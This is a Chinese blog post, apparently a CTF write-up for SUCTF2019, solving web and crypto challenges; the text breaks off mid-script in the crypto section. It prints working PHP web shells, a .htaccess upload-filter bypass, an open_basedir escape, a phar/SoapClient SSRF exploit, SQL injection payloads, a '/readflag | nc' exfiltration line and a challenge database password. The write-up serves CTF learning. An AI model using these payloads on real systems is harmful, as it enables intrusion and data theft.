<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>
    SUCTF2019 wp | 道萝岗特森&#39;s Blog
  </title>
  <meta name="description" content="hello world">
  
  <meta name="keywords" content="
  writeup
  ">
  
  <meta name="author" content="daolgts">

  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="theme-color" content="#1e2327">
  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">

  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  

  
<script>
  var _hmt = _hmt || [];
  (function(){var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
</script>


  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
</head>

<body id="replica-app">

<nav class="navbar-wrapper">
  <div class="navbar">
    <div class="container clearfix">
      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>

      <div class="navbar-search float-left desktop-only">
        <div class="navbar-search-form">
          <label for="gsc-i-id1">This website</label>
          <div id="google-search">
            <gcse:search></gcse:search>
          </div>
        </div>
      </div>

      <ul class="navbar-nav float-left">
        
        <li><a href="/archives">Archives</a></li>
        
        <!--  -->
        
        <li><a href="/tags">Tags</a></li>
        
        
          <li><a href="/links">Links</a></li>
        
        
          <li><a href="/about">About</a></li>
        
        
      </ul>

      <ul class="navbar-nav user-nav float-right desktop-only">
        <li class="user-nav-notification">
          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
        </li>
        <li>
          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
        </li>
        <li class="user-nav-logo">
          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
        </li>
      </ul>
    </div>
  </div>
</nav>

<div class="main-container">
  <header class="header-wrapper desktop-only">
  <div class="container header-site-detail">
    <ul class="header-toolbar">
      <li class="clearfix">
        <a href="/archives" class="header-toolbar-left"><i
                  class="fa fa-file-text"></i> Posts </a>
        <a href="/archives"
           class="header-toolbar-right"> 34 </a>
      </li>
      <li>
        <a href="/tags" class="header-toolbar-left"><i
                  class="fa fa-tags"></i> Tags </a>
        <a href="/tags"
           class="header-toolbar-right"> 15 </a>
      </li>
      <li>
        <a href="/categories" class="header-toolbar-left"><i
                  class="fa fa-folder-open"></i> Categories </a>
        <a href="/categories"
           class="header-toolbar-right"> 0 </a>
      </li>
    </ul>
    <h2 class="header-title">
      <i class="fa fa-book text-muted"></i>
      <a href="/">道萝岗特森&#39;s Blog</a>
      
      
    </h2>
  </div>

  <div class="container">
    <div class="header-tab-wrapper clearfix">
      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
    </div>
  </div>
</header>


<div class="post-container container">
  <h3>
    <i class="fa fa-user-o"></i>
    daolgts

    <span class="post-date float-right" title="{{moment(1567001388000).format('MMM DD, YYYY, h:mm:ss A')}}">
      <i class="fa fa-pencil-square-o"></i>
      {{moment(1567001388000).fromNow()}}
    </span>
  </h3>

  <article class="post-content">
    <h1>SUCTF2019 wp</h1>
    <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p><code>.user.ini</code>构成后门文件<br><img src="https://s2.ax1x.com/2019/08/28/mTj5Wt.png" alt="mTj5Wt.png"><br><img src="https://s2.ax1x.com/2019/08/28/mTj4JI.png" alt="mTj4JI.png"><br><img src="https://s2.ax1x.com/2019/08/28/mTjhFA.png" alt="mTjhFA.png"><br>这里用了<code>asp_tags</code>绕过<code>&lt;?</code>,也可以使用<code>&lt;script language=&#39;php&#39;&gt;</code><br><img src="https://s2.ax1x.com/2019/08/28/mTjWod.png" alt="mTjWod.png"></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&apos;_&apos;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&apos;One inch long, one inch strong!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&apos;/[\x00- 0-9A-Za-z\&apos;&quot;\`~_&amp;.,|=[\x7F]+/i&apos;, $hhh) )</span><br><span class="line">    die(&apos;Try something else!&apos;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>给了一个<code>get_the_flag</code>函数，很明显就是通过下面的代码调用<code>get_the_flag</code>函数上传文件拿shell</p>
<h3 id="利用异或来构造-GET变量"><a href="#利用异或来构造-GET变量" class="headerlink" title="利用异或来构造$_GET变量"></a>利用异或来构造<code>$_GET</code>变量</h3><p>下面传入的参数限制很严格，长度不大于18，所用字符不多于12个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo urlencode(&apos;_GET&apos;^urldecode(&apos;%ff%ff%ff%ff&apos;));</span><br><span class="line">%A0%B8%BA%AB</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%A0=get_the_flag</span><br></pre></td></tr></table></figure>

<h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>上传文件扩展名不能有<code>ph</code>，内容中不能有<code>&lt;?</code>，同时要满足<code>exif_imagetype</code>对图片格式的验证</p>
<p>上传<code>.htaccess</code>来解析上传文件<br><a href="https://thibaudrobin.github.io/articles/bypass-filter-upload/" target="_blank" rel="noopener">https://thibaudrobin.github.io/articles/bypass-filter-upload/</a></p>
<h4 id="X-Bit-Map-文件"><a href="#X-Bit-Map-文件" class="headerlink" title="X Bit Map 文件"></a>X Bit Map 文件</h4><p>以下C代码示例了一个XBM文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br><span class="line">static char test_bits[] = &#123;</span><br><span class="line">0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,</span><br><span class="line">0x00, 0x60 &#125;;</span><br></pre></td></tr></table></figure>

<p>前两行定义了图片的宽和高，以<code>#</code>开头，而<code>#</code>也是<code>.htaccess</code>文件的注释符</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .php16      # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure>

<p>这里的<code>.htaccess</code>文件可以用php解析自定义后缀名的文件，启用了特殊文本编码（utf-16)</p>
<p>然后上传一个<code>utf-16</code>编码的php文件，绕过对内容的检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># Description : create and bypass file upload filter with .htaccess</span><br><span class="line"># Author : Thibaud Robin</span><br><span class="line"></span><br><span class="line"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span><br><span class="line">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span><br><span class="line"></span><br><span class="line">def generate_php_file(filename, script):</span><br><span class="line">	phpfile = open(filename, &apos;wb&apos;) </span><br><span class="line"></span><br><span class="line">	phpfile.write(script.encode(&apos;utf-16be&apos;))</span><br><span class="line">	phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">	phpfile.close()</span><br><span class="line"></span><br><span class="line">def generate_htacess():</span><br><span class="line">	htaccess = open(&apos;.htaccess&apos;, &apos;wb&apos;)</span><br><span class="line"></span><br><span class="line">	htaccess.write(SIZE_HEADER)</span><br><span class="line">	htaccess.write(b&apos;AddType application/x-httpd-php .php16\n&apos;)</span><br><span class="line">	htaccess.write(b&apos;php_value zend.multibyte 1\n&apos;)</span><br><span class="line">	htaccess.write(b&apos;php_value zend.detect_unicode 1\n&apos;)</span><br><span class="line">	htaccess.write(b&apos;php_value display_errors 1\n&apos;)</span><br><span class="line"></span><br><span class="line">	htaccess.close()</span><br><span class="line">		</span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(&quot;webshell.php16&quot;, &quot;&lt;?php system($_GET[&apos;cmd&apos;]); die(); ?&gt;&quot;)</span><br><span class="line">generate_php_file(&quot;scandir.php16&quot;, &quot;&lt;?php echo implode(&apos;\n&apos;, scandir($_GET[&apos;dir&apos;])); die(); ?&gt;&quot;)</span><br><span class="line">generate_php_file(&quot;getfile.php16&quot;, &quot;&lt;?php echo file_get_contents($_GET[&apos;file&apos;]); die(); ?&gt;&quot;)</span><br><span class="line">generate_php_file(&quot;info.php16&quot;, &quot;&lt;?php phpinfo(); die(); ?&gt;&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="0x00-开头的图片"><a href="#0x00-开头的图片" class="headerlink" title="0x00 开头的图片"></a><code>0x00</code> 开头的图片</h4><p>ico、wbmp文件以<code>0x00</code>开头</p>
<p><code>.htaccess</code>中以<code>\x00</code>开头该行会被忽略</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x8a\x39\x8a\x39AAAAAAAAAA</span><br><span class="line">AddHandler application/x-httpd-php .png</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &apos;UTF-32LE&apos;</span><br><span class="line">php_flag zend.detect_unicode 0</span><br><span class="line">php_value auto_append_file &apos;php://filter/convert.iconv.UTF-8%2fUTF-32LE/resource=/tmp/IAM_THE_BESTEST_HACKZ0R&apos;</span><br></pre></td></tr></table></figure>

<p>这里使用<code>UTF-32LE</code>编码PHP文件，使用伪协议转换编码</p>
<p>也可以使用base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">htaccess = b&quot;&quot;&quot;\x00\x00\x8a\x39\x8a\x39</span><br><span class="line">AddType application/x-httpd-php .asp</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=upload/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.asp&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">shell = b&quot;\x00\x00\x8a\x39\x8a\x39&quot;+b&quot;00&quot;+ base64.b64encode(b&quot;&lt;?php eval($_GET[&apos;c&apos;]);?&gt;&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=mkdir(&quot;/tmp/fuck&quot;);chdir(&apos;/tmp/fuck/&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(scandir(&quot;/&quot;));</span><br></pre></td></tr></table></figure>

<h2 id="upload-lab2"><a href="#upload-lab2" class="headerlink" title="upload-lab2"></a>upload-lab2</h2><p>题目可以上传文件，检查文件类型</p>
<p>对上传文件的扩展名、文件大小、文件内容做了限制</p>
<p>在<code>admin.php</code>中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    if(isset($_POST[&apos;admin&apos;]))&#123;</span><br><span class="line">        </span><br><span class="line">        $ip = $_POST[&apos;ip&apos;];     //你用来获取flag的服务器ip</span><br><span class="line">        $port = $_POST[&apos;port&apos;]; //你用来获取flag的服务器端口</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[&apos;clazz&apos;];</span><br><span class="line">        $func1 = $_POST[&apos;func1&apos;];</span><br><span class="line">        $func2 = $_POST[&apos;func2&apos;];</span><br><span class="line">        $func3 = $_POST[&apos;func3&apos;];</span><br><span class="line">        $arg1 = $_POST[&apos;arg1&apos;];</span><br><span class="line">        $arg2 = $_POST[&apos;arg2&apos;];</span><br><span class="line">        $arg2 = $_POST[&apos;arg3&apos;];</span><br><span class="line">        $admin = new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要通过本地来访问，执行<code>$admin-&gt;check();</code></p>
<p>在<code>Ad</code>类中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()&#123;</span><br><span class="line">    getFlag($this-&gt;ip, $this-&gt;port);</span><br><span class="line">    //使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接就能拿到flag</p>
<p>在<code>class.php</code>中，<code>File</code>类的<code>getMIME</code>方法调用了<code>finfo_file</code>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getMIME()&#123;</span><br><span class="line">    $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">    $this-&gt;type = finfo_file($finfo, $this-&gt;file_name);</span><br><span class="line">    finfo_close($finfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>finfo_file/finfo_buffer/mime_content_type</code>均通过<code>_php_finfo_get_type</code>间接调用了关键函数<code>php_stream_open_wrapper_ex</code>，导致均可以使用<code>phar://</code>触发 phar反序列化</p>
<p><code>File</code>类的<code>__wakeup</code>方法通过反射初始化了一个类并调用了其<code>check</code>成员方法，将类名改为<code>SoapClient</code>，调用<code>check</code>方法时就会去调用<code>__call</code>方法，实现SSRF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&apos;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&apos;,$_POST[&apos;url&apos;]))&#123;</span><br><span class="line">    die(&quot;Go away!&quot;);</span><br></pre></td></tr></table></figure>

<p>上面的代码对url进行了正则过滤</p>
<p>类似<code>compress.bzip2://phar://</code> 和 <code>compress.zlib://phar://</code>绕过，这里使用<code>php://filter/resource=</code> 或者 <code>php://filter/read=convert.base64-encode/resource=phar://</code></p>
<p>上传内容不能有<code>&lt;?</code>，使用<code>&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;</code></p>
<p>使用SOAP<br>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$phar = new Phar(&apos;test.phar&apos;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&apos;test.txt&apos;,&apos;text&apos;);</span><br><span class="line">$phar-&gt;setStub(&apos;&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;&apos;);</span><br><span class="line"></span><br><span class="line">class File &#123;</span><br><span class="line">    public $file_name = &quot;&quot;;</span><br><span class="line">    public $func = &quot;SoapClient&quot;;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $target = &quot;http://127.0.0.1/admin.php&quot;;</span><br><span class="line">        $post_string = &apos;admin=&amp;ip=111.111.111.111&amp;port=1111&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&apos;. &quot;\r\n&quot;;</span><br><span class="line">        $headers = [];</span><br><span class="line">        $this-&gt;file_name  = [</span><br><span class="line">            null,</span><br><span class="line">            array(&apos;location&apos; =&gt; $target,</span><br><span class="line">                  &apos;user_agent&apos;=&gt; str_replace(&apos;^^&apos;, &quot;\r\n&quot;, &apos;xxxxx^^Content-Type: application/x-www-form-urlencoded^^&apos;.join(&apos;^^&apos;,$headers).&apos;Content-Length: &apos;. (string)strlen($post_string).&apos;^^^^&apos;.$post_string),</span><br><span class="line">                  &apos;uri&apos;=&gt;&apos;hello&apos;)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = new File;</span><br><span class="line">echo urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>在出题笔记 <a href="https://xz.aliyun.com/t/6057#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/6057#toc-6</a> 中，说到了其实getflag应该写在<code>Ad</code>类的<code>__wakeup</code>方法中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function __wakeup()&#123;</span><br><span class="line">    system(&quot;/readflag | nc $this-&gt;ip $this-&gt;port&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是<code>__wakeup</code>方法，还需要去触发<code>unserialize()</code>函数来调用它。</p>
<p>考察<code>mysql client attack chain</code>,<code>Rogue Mysql</code>的攻击也适用于<code>phar</code>反序列化</p>
<p><a href="https://github.com/knownsec/404-Team-ShowCase/blob/master/20190801-TSec-Comprehensive%20analysis%20of%20the%20mysql%20client%20attack%20chain(%E5%85%AC%E5%BC%80%E7%89%88).pdf" target="_blank" rel="noopener">https://github.com/knownsec/404-Team-ShowCase/blob/master/20190801-TSec-Comprehensive%20analysis%20of%20the%20mysql%20client%20attack%20chain(%E5%85%AC%E5%BC%80%E7%89%88).pdf</a></p>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<p>堆叠注入，比赛时没有fuzz出来</p>
<p>payload : <code>*,2</code> –&gt; <code>select *,2||flag from Flag</code></p>
<p>另一种做法：<code>1;set sql_mode=pipes_as_concat;select 1</code></p>
<p>将<code>||</code>视为字符串的连接操作符而非<code>或</code>运算符</p>
<p><a href="https://blog.csdn.net/lixora/article/details/60572357" target="_blank" rel="noopener">https://blog.csdn.net/lixora/article/details/60572357</a></p>
<h2 id="pythonginx"><a href="#pythonginx" class="headerlink" title="pythonginx"></a>pythonginx</h2><p><code>unicode</code> to <code>ascii</code> 的域名转换导致的解析问题</p>
<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<p>payload : <code>url=file://suctf.c%E2%84%82/../../../usr/fffffflag</code></p>
<h2 id="Cocktail’s-Remix"><a href="#Cocktail’s-Remix" class="headerlink" title="Cocktail’s Remix"></a>Cocktail’s Remix</h2><p>robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /info.php</span><br><span class="line">Disallow: /download.php</span><br><span class="line">Disallow: /config.php</span><br></pre></td></tr></table></figure>

<p><code>info.php</code> phpinfo页面</p>
<p><code>download.php</code> 页面任意文件下载</p>
<p><code>config.php</code> 有mysql配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># config.php</span><br><span class="line">&lt;?php</span><br><span class="line">    //$db_server = &quot;MysqlServer&quot;;</span><br><span class="line">    //$db_username = &quot;dba&quot;;</span><br><span class="line">    //$db_password = &quot;rNhHmmNkN3xu4MBYhm&quot;;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>info.php</code>里显示加载了<code>mod_cocktail</code>模块</p>
<p>下载<code>/usr/lib/apache2/modules/mod_cocktail.so</code>，通过分析,<code>reffer</code>头base64编码能rce</p>
<p>payload:</p>
<p>base64encode:<code>mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e &quot;use flag;select * from flag;&quot;</code></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="mt"><a href="#mt" class="headerlink" title="mt"></a>mt</h2><p><code>convert</code>函数是修改过的马特赛特旋转算法（Mersenne_Twister）里的,写解密函数即可</p>
<p>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Random import random</span><br><span class="line">from Crypto.Util import number</span><br><span class="line"></span><br><span class="line">def convert(m):</span><br><span class="line">    m = m ^ m &gt;&gt; 13</span><br><span class="line">    m = m ^ m &lt;&lt; 9 &amp; 2029229568</span><br><span class="line">    m = m ^ m &lt;&lt; 17 &amp; 2245263360</span><br><span class="line">    m = m ^ m &gt;&gt; 19</span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line">def transform(message):</span><br><span class="line">    assert len(message) % 4 == 0</span><br><span class="line">    new_message = &apos;&apos;</span><br><span class="line">    for i in range(len(message) / 4):</span><br><span class="line">        block = message[i * 4 : i * 4 +4]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, 4)</span><br><span class="line">        new_message += block</span><br><span class="line">    return new_message</span><br><span class="line"></span><br><span class="line">def unshiftRight(x, shift):</span><br><span class="line">    res = x</span><br><span class="line">    for i in range(32):</span><br><span class="line">        res = x ^ res &gt;&gt; shift</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def unshiftLeft(x, shift, mask):</span><br><span class="line">    res = x</span><br><span class="line">   